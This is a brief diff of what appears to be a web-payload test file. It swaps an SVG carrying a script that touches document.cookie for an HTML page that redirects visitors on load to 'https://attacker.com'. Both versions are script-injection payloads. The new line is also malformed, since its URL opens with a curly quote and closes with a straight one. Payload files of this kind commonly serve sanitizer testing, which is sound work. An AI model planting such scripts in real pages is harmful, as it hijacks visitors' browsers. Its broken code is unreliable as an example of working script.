@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<svg xmlns="http://www.w3.org/2000/svg">
-<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
-</svg>
+<html>
+  <script>window.onload = window.location.href= ‘https://attacker.com';</script>
+
+</html>
